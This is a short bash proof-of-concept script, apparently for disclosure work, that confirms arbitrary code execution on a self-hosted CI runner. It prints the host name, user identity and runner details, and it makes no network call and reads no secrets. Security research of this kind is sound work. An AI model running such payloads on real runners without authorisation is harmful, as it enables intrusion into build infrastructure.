#!/bin/bash                                                                                                                                                                                 
# PoC: Proves arbitrary code execution on self-hosted runner                                                                                                                                
# Does NOT access secrets, tokens, or sensitive infrastructure                                                                                                                              
                                                                  
echo "::warning::PoC: Arbitrary code execution confirmed on self-hosted runner"                                                                                                             
echo "[PoC] hostname=$(hostname)"                               
echo "[PoC] whoami=$(whoami)"                                                                                                                                                               
echo "[PoC] id=$(id)"                                           
echo "[PoC] runner_name=${RUNNER_NAME:-unknown}"                                                                                                                                            
echo "[PoC] runner_os=${RUNNER_OS:-unknown}"
